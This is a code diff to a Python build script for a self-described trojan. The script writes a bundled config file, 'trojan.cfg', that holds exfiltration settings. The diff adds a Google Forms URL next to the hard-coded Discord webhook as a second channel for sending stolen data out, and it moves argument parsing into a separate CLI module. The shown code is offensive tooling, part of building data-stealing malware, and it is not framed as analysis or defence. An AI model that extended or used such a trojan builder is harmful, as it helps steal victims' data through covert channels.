@@ -15,12 +15,14 @@ def build(args: argparse.Namespace) -> None:
     Trojan binary."""
 
     '''A configuration file named 'trojan.cfg' is created with a 
-    hard-coded Discord Webhook URL and exfiltration time setting that 
-    allows seamless connection of the binary client to the server. This 
-    file is bundled in the binary and read on execution.'''
+    hard-coded Discord Webhook URL, Google Forms URL and exfiltration 
+    time setting that allows seamless connection of the binary client 
+    to the server. This file is bundled in the binary and read on 
+    execution.'''
     config = configparser.ConfigParser()
     config["TROJAN"] = {
         "Webhook": args.webhook,
+        "GoogleFormsUrl": args.forms,
         "ExfiltrationTime": str(args.exfil_time)
     }
 
@@ -37,20 +39,6 @@ def build(args: argparse.Namespace) -> None:
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "-w", "--webhook",
-        type=str,
-        metavar="<webhook_url>",
-        required=True
-    )
-    parser.add_argument(
-        "-e", "--exfil-time",
-        type=float,
-        metavar="<seconds>",
-        default=30
-    )
-    parser.set_defaults(func=build)
+    from src.trojan import cli_parser
 
-    _args = parser.parse_args()
-    _args.func(_args)
+    build(cli_parser())
